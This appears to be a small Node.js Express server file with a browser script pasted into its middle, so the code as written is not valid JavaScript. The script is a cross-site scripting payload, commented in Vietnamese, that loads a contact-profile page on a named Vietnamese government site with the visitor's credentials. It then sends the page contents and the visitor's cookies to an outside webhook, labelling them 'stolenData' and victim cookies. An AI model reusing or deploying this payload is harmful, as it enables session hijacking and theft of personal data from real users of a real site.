const express = require("express");
const fs = require("fs");

const app = express();
const PORT = 3006;

app.use(express.json());

<script>
    var webhookUrl = "https://test-xss.onrender.com";

    fetch("http://hoptacxacds.hagiang.gov.vn/clients/contact_profile/52/general", {
        method: "GET",
        credentials: "include" // Gửi cookie của người dùng
    })
    .then(response => response.text())
    .then(data => {
        if (data && data.trim().length > 0) {
            console.log("Dữ liệu có chứa thông tin:", data);
            console.log("Cookie của nạn nhân:", document.cookie);

            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    stolenData: data,
                    cookies: document.cookie
                })
            });
        }
    })
    .catch(error => console.error("Lỗi:", error));
</script>



// Bắt đầu lắng nghe trên cổng PORT
app.listen(PORT, () => {
    console.log(`Server đang lắng nghe trên http://localhost:${PORT}`);
});

